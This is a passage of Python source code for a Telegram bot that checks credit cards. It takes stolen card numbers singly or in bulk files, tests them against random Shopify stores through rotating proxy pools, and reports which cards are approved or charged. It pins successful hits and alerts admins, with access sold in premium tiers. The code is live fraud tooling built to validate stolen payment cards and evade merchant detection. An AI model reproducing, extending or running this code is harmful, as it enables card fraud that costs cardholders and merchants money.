            f"🚫 <b>Invalid format:</b> {rejected_count}\n"
            f"<b>{SEP}</b>\n"
            f"🔌 <b>Pool total:</b> {pool_total} proxies"
        ), parse_mode='html')
        return

    # ── USER PATH: add ALL valid proxies to personal pool ────────────────────
    result    = add_user_proxies_bulk(uid, raw_lines)
    total_now = len(get_user_proxy_list(uid))
    await smsg.edit(pe(
        f"✅ <b>Your Proxy Pool Updated!</b>\n"
        f"<b>{SEP}</b>\n"
        f"📄 <b>File:</b> <code>{html.escape(fname or 'proxies.txt')}</code>\n"
        f"📋 <b>Lines read:</b> {len(raw_lines)}\n"
        f"➕ <b>Added:</b>      {result['added']}\n"
        f"♻️ <b>Duplicates:</b> {result['duplicates']}\n"
        f"❌ <b>Invalid:</b>    {result['invalid']}\n"
        f"<b>{SEP}</b>\n"
        f"🔌 <b>Your pool now:</b> {total_now} proxies\n\n"
        f"<i><code>/myproxies</code> to view · <code>/myproxies clear</code> to wipe</i>"
    ), parse_mode='html')

# ─── /setamount ─────────────────────────────────────────────────────────────────
# Access: admins, premium users, auth/grant/key users — any valid access tier.
# Admins get an extra column showing how many sites are tagged per tier.
@bot.on(events.NewMessage(pattern=r'^/setamount(\s+\S+)?$'))
async def setamount_command(event):
    uid = event.sender_id

    # ── access gate: admins OR any user with valid access ───────────────────
    if not (is_admin(uid) or is_premium(uid)):
        await event.reply(pe("❌ <b>Access Denied.</b>"), parse_mode='html')
        return

    parts = event.message.text.strip().split()
    meta  = load_sites_meta()
    sites = load_sites()

    # ── build per-tier stats line (shown to everyone, more detail for admins)
    def _tier_stats_line() -> str:
        lines = []
        for t_key, t_val in AMOUNT_TIERS.items():
            if t_key == 'any':
                lines.append(f"  • <b>any</b> — all {len(sites)} sites")
            else:
                tagged = sum(1 for s in sites if meta.get(s, {}).get('tier') == t_key)
                if is_admin(uid):
                    lines.append(f"  • <b>${t_key}</b> — {tagged} tagged sites")
                elif tagged > 0:
                    lines.append(f"  • <b>${t_key}</b>")
        return "\n".join(lines)

    # ── no argument → show current setting and inline picker ─────────────────
    if len(parts) == 1:
        cur   = get_user_amount_tier(uid)
        label = AMOUNT_TIERS.get(cur, ('Any',))[0]
        stats = _tier_stats_line()
        await event.reply(
            pe(
                f"<b>💰 Amount Filter</b>\n"
                f"<b>{SEP}</b>\n"
                f"Current: <b>{label}</b>\n\n"
                f"<b>Available tiers:</b>\n{stats}\n\n"
                f"Tap a tier below or use:\n"
                f"<code>/setamount 1</code>  <code>/setamount 5</code>  "
                f"<code>/setamount 10</code>  <code>/setamount 20</code>  "
                f"<code>/setamount any</code>"
            ),
            parse_mode='html',
            buttons=make_markup(rows_amount_select(uid))
        )
        return

    # ── argument provided → validate and apply ───────────────────────────────
    tier = parts[1].lower().strip()
    if tier not in AMOUNT_TIERS:
        await event.reply(pe(
            f"❌ <b>Invalid tier.</b> Valid options:\n"
            f"<code>1</code> · <code>5</code> · <code>10</code> · <code>20</code> · <code>any</code>"
        ), parse_mode='html')
        return

    set_user_amount_tier(uid, tier)
    label  = AMOUNT_TIERS[tier][0]

    if tier == 'any':
        tagged = len(sites)
        note   = f"{tagged} sites (all)"
    else:
        tagged = sum(1 for s in sites if meta.get(s, {}).get('tier') == tier)
        note   = f"{tagged} tagged sites"

    warning = ""
    if tagged == 0 and tier != 'any':
        warning = (
            f"\n\n⚠️ <b>No sites tagged as {label} yet.</b>\n"
            f"Ask admin to run <code>/tagsite [url] {tier}</code>."
        )

    await event.reply(pe(
        f"✅ <b>Amount filter → {label}</b>\n"
        f"<b>{SEP}</b>\n"
        f"🔌 Checks will run on <b>{note}</b>.{warning}"
    ), parse_mode='html')

# ─── /ran — random site check (single card or .txt mass check) ─────────────────
@bot.on(events.NewMessage(pattern=r'^/ran(\s+\S.*)?$'))
async def ran_command(event):
    uid = event.sender_id
    if not is_premium(uid):
        await event.reply(pe("❌ <b>Access Denied.</b>"), parse_mode='html'); return

    all_sites = load_sites()
    proxies   = get_proxies_for_user(uid) or load_proxies()
    if not all_sites:
        await event.reply(pe("❌ <b>No sites configured.</b> Contact admin."), parse_mode='html'); return
    if not proxies:
        await event.reply(pe("❌ <b>No proxy set!</b>\n\nSet your proxy:\n<code>/setproxy ip:port</code>"), parse_mode='html'); return

    text_after = event.message.text[4:].strip()   # everything after /ran

    # ── Single card mode ────────────────────────────────────────────────────────
    if text_after:
        cards = extract_cc(text_after)
        if not cards:
            await event.reply(pe(
                "❌ <b>Invalid card.</b>\n\n"
                "<b>Single check:</b> <code>/ran 4111111111111111|12|2026|123</code>\n"
                "<b>Mass check:</b> Reply to a .txt file with <code>/ran</code>"
            ), parse_mode='html'); return
        card        = cards[0]
        ran_site    = random.choice(all_sites)
        smsg = await event.reply(pe(
            f"<b>🎲 {fi('Random Check')}...</b>\n"
            f"<b>{SEP}</b>\n"
            f"🃏 <code>{card}</code>\n"
            f"🌐 <b>Site:</b> {len(all_sites)} in pool (random)"
        ), parse_mode='html')
        try:
            result, bin_info, (cname, cusername) = await asyncio.gather(
                check_card_with_retry(card, [ran_site], proxies, max_retries=1, max_proxy_tries=2),
                get_bin_info(card.split('|')[0]),
                get_display_info(uid),
            )
            resp = build_result_card(result, bin_info, uid, cname)
            await smsg.edit(resp, parse_mode='html')
            record_check(uid, cname, result.get('status', 'Dead'), username=cusername)
            record_log(uid, cname, cusername,
                       result.get('card', card), result.get('status', 'Dead'),
                       result.get('message', ''), result.get('site', ''),
                       result.get('gateway', 'Shopify Payments'), result.get('price', '-'))
            if result.get('status') == 'Charged':
                try: await bot.pin_message(uid, smsg.id, notify=True)
                except: pass
            if result.get('status') in ('Charged', 'Approved'):
                asyncio.create_task(notify_admins_hit(uid, result, bin_info, cname))
        except Exception as e:
            await smsg.edit(pe(f"❌ Error: {e}"), parse_mode='html')
        return

    # ── Mass check mode (reply to .txt) ─────────────────────────────────────────
    if not event.reply_to_msg_id:
        await event.reply(pe(
            "<b>🎲 /ran — Random Site Checker</b>\n"
            f"<b>{SEP}</b>\n"
            "Each card is tested on a <b>random site</b> from all "
            f"{len(all_sites)} in the pool — ignoring your amount filter.\n\n"
            "<b>Single check:</b>\n<code>/ran card|mm|yy|cvv</code>\n\n"
            "<b>Mass check:</b>\nReply to a .txt with <code>/ran</code>"
        ), parse_mode='html'); return

    reply = await event.get_reply_message()
    if not reply or not reply.file:
        await event.reply(pe("❌ Please reply to a <code>.txt</code> file."), parse_mode='html'); return
    _fname = reply.file.name or ''
    _fmime = getattr(reply.file, 'mime_type', '') or ''
    if not (_fname.lower().endswith('.txt') or 'text/plain' in _fmime):
        await event.reply(pe("❌ Please reply to a <code>.txt</code> file."), parse_mode='html'); return

    fp = await reply.download_media()
    async with aiofiles.open(fp, 'r', encoding='utf-8', errors='ignore') as f:
        content = await f.read()
    try: os.remove(fp)
    except: pass
    cards = extract_cc(content)
    if not cards:
        await event.reply(pe("❌ No valid cards found."), parse_mode='html'); return
    limit = get_user_limit(uid)
    if len(cards) > limit:
        cards = cards[:limit]
        await event.reply(pe(f"⚠️ <b>File trimmed to {limit} cards</b> (your {get_user_tier(uid)} plan limit)."), parse_mode='html')

    _RAN_SEP  = "\u25b0" * 20
    _RAN_TOT  = '<tg-emoji emoji-id="5298970748172385213">\u2b50</tg-emoji>'
    _RAN_CHK  = '<tg-emoji emoji-id="6267229004311303657">\u2b50</tg-emoji>'
    _RAN_APP  = '<tg-emoji emoji-id="6267118537752450044">\u2b50</tg-emoji>'
    _RAN_DCL  = '<tg-emoji emoji-id="6264989883241076562">\u2b50</tg-emoji>'
    _RAN_CHG  = '<tg-emoji emoji-id="6266905086467773719">\u2b50</tg-emoji>'
    _ran_bar  = "\u2591" * 18 + "  0%"
    text = (
        f"\U0001f3b2 <b>{fi('Random Mass Check')}</b>\n"
        f"<b>{_RAN_SEP}</b>\n"
        f"  <code>{_ran_bar}</code>\n\n"
        f"{_RAN_TOT}  <b>{fi('Total')}</b>      \u27b6  {len(cards)}\n"
        f"{_RAN_CHK}  <b>{fi('Checked')}</b>    \u27b6  0\n"
        f"{_RAN_APP}  <b>{fi('Approved')}</b>   \u27b6  0\n"
        f"{_RAN_DCL}  <b>{fi('Declined')}</b>   \u27b6  0\n"
        f"{_RAN_CHG}  <b>{fi('Charged')}</b>    \u27b6  0\n"
        f"<b>{_RAN_SEP}</b>"
    )
    msg_id = await raw_send(uid, text, rows_stop(), reply_to=event.message.id)
    if msg_id:
        asyncio.create_task(run_mass_check(uid, cards, msg_id, random_sites=True))

# ─── TXT FILE AUTO-DETECTION ───────────────────────────────────────────────────
@bot.on(events.NewMessage(func=lambda e: e.file and e.file.name and e.file.name.endswith('.txt') and not e.via_bot_id))
async def txt_detected(event):
    uid = event.sender_id
    if not is_premium(uid): return
    fp = await event.download_media()
    try:
        async with aiofiles.open(fp,'r',encoding='utf-8',errors='ignore') as f:
            content = await f.read()
    finally:
        try: os.remove(fp)
        except: pass
    cards = extract_cc(content)
    if not cards:
        await event.reply(pe("❌ No valid cards found in this file."), parse_mode='html'); return
    proxies = get_proxies_for_user(uid)
    if not proxies:
        await event.reply(pe("❌ <b>No proxy set!</b>\n\nSet your proxy first:\n<code>/setproxy ip:port</code>\nor\n<code>/setproxy ip:port:user:pass</code>"), parse_mode='html'); return
    limit = get_user_limit(uid)
    if len(cards) > limit:
        cards = cards[:limit]
        await event.reply(pe(f"⚠️ <b>File trimmed to {limit} cards</b> (your {get_user_tier(uid)} plan limit)."), parse_mode='html')
    pending_checks[uid] = {'cards': cards}
    preview_lines = "\n".join(
        [f'⭐ <tg-spoiler><code>{c}</code></tg-spoiler>' for c in cards[:3]]
    )
    more = f"\n<i>And {len(cards)-3} more...</i>" if len(cards) > 3 else ""
    text = pe(f"{preview_lines}{more}\n\n<b>🔥 TAP BELOW TO CHECK</b>")
    await raw_send(uid, text,
        [[{"text": "💳  Check this CC", "callback_data": f"start_check_{uid}"}]],
        reply_to=event.message.id)

# ─── /msh & /chk ───────────────────────────────────────────────────────────────
@bot.on(events.NewMessage(pattern=r'^/(msh|chk)$'))
async def mass_check_cmd(event):
    uid = event.sender_id
    if not await enforce_subscription(event): return
    if not is_premium(uid):
        await event.reply(pe("❌ <b>Access Denied.</b>"), parse_mode='html'); return
    if not event.reply_to_msg_id:
        await event.reply(pe("⚡ Reply to a <code>.txt</code> file, or just send the file directly!"), parse_mode='html'); return
    reply = await event.get_reply_message()
    if not reply or not reply.file:
        await event.reply(pe("❌ Please reply to a <code>.txt</code> file."), parse_mode='html'); return
    _fname = reply.file.name or ''
    _fmime = getattr(reply.file, 'mime_type', '') or ''
    if not (_fname.lower().endswith('.txt') or 'text/plain' in _fmime):
        await event.reply(pe("❌ Please reply to a <code>.txt</code> file."), parse_mode='html'); return
    sites, _eff_tier = load_sites_for_user(uid)
    proxies = get_proxies_for_user(uid)
    _tier        = get_user_amount_tier(uid)
    _range_label = tier_range_label(_eff_tier)
    if not sites:
        await event.reply(pe("❌ No sites available. Contact admin."), parse_mode='html'); return
    if not proxies: await event.reply(pe("❌ <b>No proxy set!</b>\n\nSet your proxy:\n<code>/setproxy ip:port</code>"), parse_mode='html'); return
    fp = await reply.download_media()
    async with aiofiles.open(fp,'r',encoding='utf-8',errors='ignore') as f:
        content = await f.read()
    cards = extract_cc(content)
    try: os.remove(fp)
    except: pass
    if not cards:
        await event.reply(pe("❌ No valid cards found."), parse_mode='html'); return
    limit = get_user_limit(uid)
    if len(cards) > limit:
        cards = cards[:limit]
        await event.reply(pe(f"⚠️ <b>File trimmed to {limit} cards</b> (your {get_user_tier(uid)} plan limit)."), parse_mode='html')
    _INIT_SEP = "\u25b0" * 20
    _EM_TOT   = '<tg-emoji emoji-id="5298970748172385213">\u2b50</tg-emoji>'
    _EM_CHK   = '<tg-emoji emoji-id="6267229004311303657">\u2b50</tg-emoji>'
    _EM_APP   = '<tg-emoji emoji-id="6267118537752450044">\u2b50</tg-emoji>'
    _EM_DCL   = '<tg-emoji emoji-id="6264989883241076562">\u2b50</tg-emoji>'
    _EM_CHG   = '<tg-emoji emoji-id="6266905086467773719">\u2b50</tg-emoji>'
    _init_bar = "\u2591" * 18 + "  0%"
    text = (
        f"\u2b50 <b>{fi('Shopify Mass Check')}</b>\n"
        f"<b>{_INIT_SEP}</b>\n"
        f"  <code>{_init_bar}</code>\n\n"
        f"{_EM_TOT}  <b>{fi('Total')}</b>      \u27b6  {len(cards)}\n"
        f"{_EM_CHK}  <b>{fi('Checked')}</b>    \u27b6  0\n"
        f"{_EM_APP}  <b>{fi('Approved')}</b>   \u27b6  0\n"
        f"{_EM_DCL}  <b>{fi('Declined')}</b>   \u27b6  0\n"
        f"{_EM_CHG}  <b>{fi('Charged')}</b>    \u27b6  0\n"
        f"<b>{_INIT_SEP}</b>"
    )
    msg_id = await raw_send(uid, text, rows_stop(), reply_to=event.message.id)
    if msg_id:
        asyncio.create_task(run_mass_check(uid, cards, msg_id))

# ─── PROXY POOL COMMANDS ───────────────────────────────────────────────────────
def _validate_proxy_fmt(p: str) -> bool:
    """
    Accept:
      ip:port
      ip:port:user:pass
      socks5://ip:port
      http://user:pass@ip:port
    Reject anything without a numeric port in 1-65535.
    """
    p = p.strip()
    if not p or ':' not in p:
        return False
    if '://' in p:
        try:
            from urllib.parse import urlparse as _up
            r = _up(p)
            return bool(r.hostname) and r.port is not None and 1 <= r.port <= 65535
        except Exception:
            return False
    parts = p.split(':')
    try:
        port = int(parts[1])
        return bool(parts[0]) and 1 <= port <= 65535
    except (ValueError, IndexError):
        return False


def _validate_site_fmt(u: str) -> bool:
    """Must be http(s):// with a non-empty netloc."""
    u = u.strip()
    if not u:
        return False
    try:
        from urllib.parse import urlparse as _up
        r = _up(u)
        return r.scheme in ('http', 'https') and bool(r.netloc)
    except Exception:
        return False


def _normalise_site(u: str) -> str:
    """Strip trailing slash for consistent dedup."""
    return u.rstrip('/')


def _tokenise(text: str) -> list:
    """
    Split raw text into proxy/URL tokens.
    Handles multi-line blocks and space-separated lists on one line.
    Skips blank lines and # comments.
    """
    tokens = []
    for line in text.splitlines():
        line = line.strip()
        if not line or line.startswith('#'):
            continue
        # space-separated values on one line
        parts = line.split()
        tokens.extend(parts)
    return tokens


async def _add_proxies_bulk(event, uid: int, raw_proxies: list) -> None:
    """Validate, dedup and persist a batch of proxy strings, then reply with a full report."""
    curr_set = set(load_proxies())
    added, dups, invalid = [], [], []

    seen_this_batch: set = set()
    for p in raw_proxies:
        p = p.strip()
        if not p or p.startswith('#'):
            continue
        if not _validate_proxy_fmt(p):
            invalid.append(p)
        elif p in curr_set or p in seen_this_batch:
            dups.append(p)
        else:
            added.append(p)
            seen_this_batch.add(p)

    if added:
        async with aiofiles.open(PROXY_FILE, 'a') as f:
            for p in added:
                await f.write(f"{p}\n")

    total = len(curr_set) + len(added)
    lines = [
        f"📊 <b>Proxy Import Report</b>",
        f"<b>{SEP}</b>",
        f"✅ <b>Added:</b>      {len(added)}",
        f"⚠️ <b>Duplicates:</b> {len(dups)}",
        f"❌ <b>Invalid:</b>    {len(invalid)}",
        f"<b>{SEP}</b>",
        f"📋 <b>Pool now:</b> {total} proxies",
    ]
    if invalid and len(invalid) <= 5:
        lines.append("\n❌ <b>Invalid entries:</b>")
        for iv in invalid[:5]:
            lines.append(f"  <code>{iv[:60]}</code>")
    await event.reply(pe("\n".join(lines)), parse_mode='html')


async def _add_sites_bulk(event, uid: int, raw_sites: list) -> None:
    """Validate, dedup and persist a batch of site URLs, then reply with a full report."""
    curr_set = set(load_sites())
    added, dups, invalid = [], [], []

    seen_this_batch: set = set()
    for u in raw_sites:
        u = _normalise_site(u.strip())
        if not u or u.startswith('#'):
            continue
        if not _validate_site_fmt(u):
            invalid.append(u)
        elif u in curr_set or u in seen_this_batch:
            dups.append(u)
        else:
            added.append(u)
            seen_this_batch.add(u)

    if added:
        async with aiofiles.open(SITES_FILE, 'a') as f:
            for u in added:
                await f.write(f"{u}\n")

    total = len(curr_set) + len(added)
    lines = [
        f"📊 <b>Site Import Report</b>",
        f"<b>{SEP}</b>",
        f"✅ <b>Added:</b>      {len(added)}",
        f"⚠️ <b>Duplicates:</b> {len(dups)}",
        f"❌ <b>Invalid:</b>    {len(invalid)}",
        f"<b>{SEP}</b>",
        f"🌐 <b>Pool now:</b> {total} sites",
    ]
    if invalid and len(invalid) <= 5:
        lines.append("\n❌ <b>Invalid entries:</b>")
        for iv in invalid[:5]:
            lines.append(f"  <code>{iv[:80]}</code>")
    await event.reply(pe("\n".join(lines)), parse_mode='html')


@bot.on(events.NewMessage(pattern=r'^/addproxy'))
async def add_proxy_command(event):
    uid = event.sender_id

    # ── access gate ───────────────────────────────────────────────────────
    # Admins → global pool   |   Users → personal pool
    if not (is_admin(uid) or is_premium(uid)):
        await event.reply(pe("❌ <b>Access Denied.</b>"), parse_mode='html')
        return

    # ── resolve document source ───────────────────────────────────────────
    doc_msg = None
    reply   = await event.get_reply_message()
    if reply and reply.document:
        doc_msg = reply
    elif event.message.document:
        doc_msg = event.message

    # ══════════════════════════════════════════════════════════════════════
    # FILE PATH
    # ══════════════════════════════════════════════════════════════════════
    if doc_msg:
        attrs = doc_msg.document.attributes or []
        fname = getattr(attrs[0], 'file_name', '') if attrs else ''
        mime  = doc_msg.document.mime_type or ''
        if not (fname.lower().endswith('.txt') or mime == 'text/plain'):
            await event.reply(pe("❌ <b>Only <code>.txt</code> files are accepted.</b>"), parse_mode='html')
            return
        if doc_msg.document.size > 2 * 1024 * 1024:
            await event.reply(pe("❌ <b>File too large.</b> Max 2 MB."), parse_mode='html')
            return
        smsg = await event.reply(pe("⏳ <b>Reading file…</b>"), parse_mode='html')
        try:
            buf = await doc_msg.download_media(bytes)
        except Exception as e:
            await smsg.edit(pe(f"❌ <b>Download failed:</b> <code>{html.escape(str(e)[:120])}</code>"), parse_mode='html')
            return
        tokens = _tokenise(buf.decode('utf-8', errors='ignore'))

        if is_admin(uid):
            # Admin → global pool
            curr_set = set(load_proxies())
            added_l, dups_l, inv_l = [], [], []
            seen: set = set()
            for p in tokens:
                p = p.strip()
                if not p or p.startswith('#'): continue
                if not _validate_proxy_fmt(p): inv_l.append(p)
                elif p in curr_set or p in seen: dups_l.append(p)
                else: added_l.append(p); seen.add(p)
            if added_l:
                async with aiofiles.open(PROXY_FILE, 'a') as f:
                    for p in added_l: await f.write(f"{p}\n")
            pool_total = len(load_proxies())
            rlines = [
                f"✅ <b>Global Pool Updated!</b>", f"<b>{SEP}</b>",
                f"📄 <b>File:</b> <code>{html.escape(fname or 'file.txt')}</code>",
                f"➕ <b>Added:</b>      {len(added_l)}",
                f"♻️ <b>Duplicates:</b> {len(dups_l)}",
                f"❌ <b>Invalid:</b>    {len(inv_l)}",
                f"<b>{SEP}</b>", f"🔌 <b>Pool total:</b> {pool_total} proxies",
            ]
            if inv_l[:5]:
                rlines += ["\n❌ <b>Sample invalid:</b>"] + [f"  <code>{v[:60]}</code>" for v in inv_l[:5]]
            await smsg.edit(pe("\n".join(rlines)), parse_mode='html')
        else:
            # User → personal pool
            result = add_user_proxies_bulk(uid, tokens)
            total_now = len(get_user_proxy_list(uid))
            if result['added'] == 0 and total_now == 0:
                await smsg.edit(pe(
                    f"❌ <b>No valid proxies found in file.</b>\n"
                    f"Formats: <code>ip:port</code> · <code>ip:port:user:pass</code> · <code>socks5://ip:port</code>"
                ), parse_mode='html')
                return
            await smsg.edit(pe(
                f"✅ <b>Your Proxy Pool Updated!</b>\n"
                f"<b>{SEP}</b>\n"
                f"📄 <b>File:</b> <code>{html.escape(fname or 'file.txt')}</code>\n"
                f"➕ <b>Added:</b>      {result['added']}\n"
                f"♻️ <b>Duplicates:</b> {result['duplicates']}\n"
                f"❌ <b>Invalid:</b>    {result['invalid']}\n"
                f"<b>{SEP}</b>\n"
                f"🔌 <b>Your pool now:</b> {total_now} proxies\n\n"
                f"<i>Use <code>/myproxies</code> to see your list · <code>/clearuserproxy</code> to wipe</i>"
            ), parse_mode='html')
        return

    # ══════════════════════════════════════════════════════════════════════
    # INLINE TEXT PATH
    # ══════════════════════════════════════════════════════════════════════
    content = event.message.text[len('/addproxy'):].strip()
    if not content:
        if is_admin(uid):
            help_note = "📁 Reply to a <code>.txt</code> file → adds ALL to <b>global pool</b>"
        else:
            cur_count = len(get_user_proxy_list(uid))
            help_note = (
                f"📁 Reply to a <code>.txt</code> file → adds ALL to <b>your pool</b>\n"
                f"🔌 <b>Your pool:</b> {cur_count} proxies"
            )
        await event.reply(pe(
            f"<b>➕ Add Proxy</b>\n<b>{SEP}</b>\n"
            f"<code>/addproxy ip:port</code>\n"
            f"<code>/addproxy ip:port:user:pass</code>\n"
            f"<code>/addproxy socks5://ip:port</code>\n"
            f"<code>/addproxy http://user:pass@ip:port</code>\n\n"
            f"{help_note}"
        ), parse_mode='html')
        return

    tokens = _tokenise(content)

    if is_admin(uid):
        await _add_proxies_bulk(event, uid, tokens)
        return

    # User inline — add all valid tokens to personal pool
    result    = add_user_proxies_bulk(uid, tokens)
    total_now = len(get_user_proxy_list(uid))
    if result['added'] == 0:
        err_note = f"\n❌ <b>Invalid format.</b> Use <code>ip:port</code> or <code>ip:port:user:pass</code>" if result['invalid'] else f"\n♻️ Already in your pool."
        await event.reply(pe(f"⚠️ <b>Nothing added.</b>{err_note}"), parse_mode='html')
        return
    await event.reply(pe(
        f"✅ <b>Added to your pool!</b>\n"
        f"<b>{SEP}</b>\n"
        f"➕ <b>Added:</b>      {result['added']}\n"
        f"♻️ <b>Duplicates:</b> {result['duplicates']}\n"
        f"🔌 <b>Your pool now:</b> {total_now} proxies"
    ), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/addsocks'))
async def add_socks_command(event):
    uid = event.sender_id
    if not is_admin(uid):
        await event.reply(pe("❌ <b>Admin only.</b>"), parse_mode='html'); return

    # ── source 1: replied-to .txt file ───────────────────────────────────
    reply = await event.get_reply_message()
    if reply and reply.document:
        fname = getattr(reply.document.attributes[0], 'file_name', '') if reply.document.attributes else ''
        if fname.endswith('.txt') or reply.document.mime_type == 'text/plain':
            buf = await reply.download_media(bytes)
            if not buf:
                await event.reply(pe("❌ <b>Could not read file.</b>"), parse_mode='html'); return
            raw = _tokenise(buf.decode('utf-8', errors='ignore'))
            # inject socks5:// for bare ip:port entries
            tokens = [
                t if '://' in t else f'socks5://{t}'
                for t in raw
            ]
            await _add_proxies_bulk(event, uid, tokens); return

    # ── source 2: command body ────────────────────────────────────────────
    content = event.message.text[len('/addsocks'):].strip()
    if not content:
        await event.reply(pe(
            f"❌ <b>Usage:</b>\n<b>{SEP}</b>\n"
            f"<code>/addsocks ip:port</code>\n"
            f"<code>/addsocks ip:port:user:pass</code>\n\n"
            f"📌 Space-separated: <code>/addsocks p1 p2 p3</code>\n"
            f"📝 Or reply to a <code>.txt</code> file with <code>/addsocks</code>\n\n"
            f"ℹ️ <b>socks5:// is injected automatically</b>"
        ), parse_mode='html'); return

    raw = _tokenise(content)
    tokens = [t if '://' in t else f'socks5://{t}' for t in raw]
    await _add_proxies_bulk(event, uid, tokens)


@bot.on(events.NewMessage(pattern=r'^/addhttp'))
async def add_http_command(event):
    uid = event.sender_id
    if not is_admin(uid):
        await event.reply(pe("❌ <b>Admin only.</b>"), parse_mode='html'); return

    # ── source 1: replied-to .txt file ───────────────────────────────────
    reply = await event.get_reply_message()
    if reply and reply.document:
        fname = getattr(reply.document.attributes[0], 'file_name', '') if reply.document.attributes else ''
        if fname.endswith('.txt') or reply.document.mime_type == 'text/plain':
            buf = await reply.download_media(bytes)
            if not buf:
                await event.reply(pe("❌ <b>Could not read file.</b>"), parse_mode='html'); return
            raw = _tokenise(buf.decode('utf-8', errors='ignore'))
            # inject http:// for bare ip:port entries
            tokens = [
                t if '://' in t else f'http://{t}'
                for t in raw
            ]
            await _add_proxies_bulk(event, uid, tokens); return

    # ── source 2: command body ────────────────────────────────────────────
    content = event.message.text[len('/addhttp'):].strip()
    if not content:
        await event.reply(pe(
            f"❌ <b>Usage:</b>\n<b>{SEP}</b>\n"
            f"<code>/addhttp ip:port</code>\n"
            f"<code>/addhttp ip:port:user:pass</code>\n\n"
            f"📌 Space-separated: <code>/addhttp p1 p2 p3</code>\n"
            f"📝 Or reply to a <code>.txt</code> file with <code>/addhttp</code>\n\n"
            f"ℹ️ <b>http:// is injected automatically</b>"
        ), parse_mode='html'); return

    raw = _tokenise(content)
    tokens = [t if '://' in t else f'http://{t}' for t in raw]
    await _add_proxies_bulk(event, uid, tokens)


@bot.on(events.NewMessage(pattern=r'^/rmproxy\s+'))
async def remove_single_proxy(event):
    uid = event.sender_id
    if not is_admin(uid): await event.reply(pe("❌ <b>Admin only.</b>"), parse_mode='html'); return
    p    = event.message.text.split(' ',1)[1].strip()
    curr = load_proxies()
    if p not in curr: await event.reply(pe(f"❌ Proxy not found: <code>{p}</code>"), parse_mode='html'); return
    async with aiofiles.open(PROXY_FILE,'w') as f:
        for x in curr:
            if x != p: await f.write(f"{x}\n")
    await event.reply(pe(f"✅ <b>Proxy removed!</b>\n<code>{p}</code>"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/clearproxy$'))
async def clear_all_proxies(event):
    uid = event.sender_id
    if not is_admin(uid): await event.reply(pe("❌ <b>Admin only.</b>"), parse_mode='html'); return
    curr = load_proxies()
    if not curr: await event.reply(pe("❌ proxy.txt is already empty."), parse_mode='html'); return
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    bk = f"proxy_backup_{uid}_{ts}.txt"
    async with aiofiles.open(bk,'w') as f:
        for p in curr: await f.write(f"{p}\n")
    await event.reply(pe(f"📋 <b>Backup — {len(curr)} proxies:</b>"), file=bk, parse_mode='html')
    try: os.remove(bk)
    except: pass
    async with aiofiles.open(PROXY_FILE,'w') as f: await f.write("")
    await event.reply(pe(f"✅ <b>Cleared all {len(curr)} proxies!</b>"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/getproxy$'))
async def get_all_proxies(event):
    uid = event.sender_id
    if not is_admin(uid): await event.reply(pe("❌ <b>Admin only.</b>"), parse_mode='html'); return
    curr = load_proxies()
    if not curr: await event.reply(pe("❌ No proxies in proxy.txt."), parse_mode='html'); return
    if len(curr) <= 50:
        lines = "\n".join([f"{i+1}. <code>{p}</code>" for i,p in enumerate(curr)])
        await event.reply(pe(f"<b>📋 Proxies ({len(curr)}):</b>\n\n{lines}"), parse_mode='html')
    else:
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        fn = f"proxies_{uid}_{ts}.txt"
        async with aiofiles.open(fn,'w') as f:
            for i,p in enumerate(curr): await f.write(f"{i+1}. {p}\n")
        await event.reply(pe(f"<b>📋 Total Proxies: {len(curr)}</b>"), file=fn, parse_mode='html')
        try: os.remove(fn)
        except: pass

@bot.on(events.NewMessage(pattern=r'^/getworkingproxy$'))
async def get_working_proxies(event):
    uid = event.sender_id
    if not is_admin(uid): await event.reply(pe("❌ <b>Admin only.</b>"), parse_mode='html'); return
    if not os.path.exists(WORKING_PROXY_FILE):
        await event.reply(pe("❌ No working proxies saved yet."), parse_mode='html'); return
    proxies = [l.strip() for l in open(WORKING_PROXY_FILE) if l.strip()]
    if not proxies:
        await event.reply(pe("❌ working_proxies.txt is empty."), parse_mode='html'); return
    if len(proxies) <= 30:
        lines = "\n".join(f"<code>{p}</code>" for p in proxies)
        await event.reply(pe(f"<b>✅ Working Proxies ({len(proxies)}):</b>\n\n{lines}"), parse_mode='html')
    else:
        await event.reply(pe(f"<b>✅ Working Proxies: {len(proxies)}</b>"), file=WORKING_PROXY_FILE, parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/clearworkingproxy$'))
async def clear_working_proxies(event):
    uid = event.sender_id
    if not is_admin(uid): await event.reply(pe("❌ <b>Admin only.</b>"), parse_mode='html'); return
    try:
        open(WORKING_PROXY_FILE, 'w').close()
        await event.reply(pe("✅ <b>Working proxies list cleared.</b>"), parse_mode='html')
    except Exception as e:
        await event.reply(pe(f"❌ Error: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/getuserproxy(\s+\d+)?$'))
async def get_user_proxy_cmd(event):
    uid = event.sender_id
    if not is_admin(uid): await event.reply(pe("❌ <b>Admin only.</b>"), parse_mode='html'); return
    parts = event.message.text.strip().split()
    if len(parts) < 2:
        try:
            data = json.load(open(USER_PROXY_FILE)) if os.path.exists(USER_PROXY_FILE) else {}
        except: data = {}
        if not data:
            await event.reply(pe("❌ No user proxies saved."), parse_mode='html'); return
        lines = "\n".join(f"{uid}: {proxy}" for uid, proxy in data.items())
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        fn = f"user_proxies_{ts}.txt"
        with open(fn, 'w') as f: f.write(lines)
        await event.reply(pe(f"<b>👤 User Proxies ({len(data)} users):</b>"), file=fn, parse_mode='html')
        try: os.remove(fn)
        except: pass
    else:
        target = int(parts[1])
        proxy = get_user_proxy(target)
        if proxy:
            await event.reply(pe(f"<b>👤 Proxy for <code>{target}</code>:</b>\n<code>{proxy}</code>"), parse_mode='html')
        else:
            await event.reply(pe(f"❌ No proxy set for <code>{target}</code>."), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/chkproxy\s+'))
async def check_single_proxy(event):
    uid = event.sender_id
    if not is_premium(uid): await event.reply(pe("❌ <b>Access Denied.</b>"), parse_mode='html'); return
    proxy = event.message.text.split(' ',1)[1].strip()
    smsg  = await event.reply(pe(f"⚡ Testing <code>{proxy}</code>..."), parse_mode='html')
    r = await test_proxy(proxy)
    if r['status'] == 'alive':
        ip = await get_proxy_ip(proxy)
        ip_line = f"\n🌐 <b>IP:</b> <code>{ip}</code>" if ip else ""
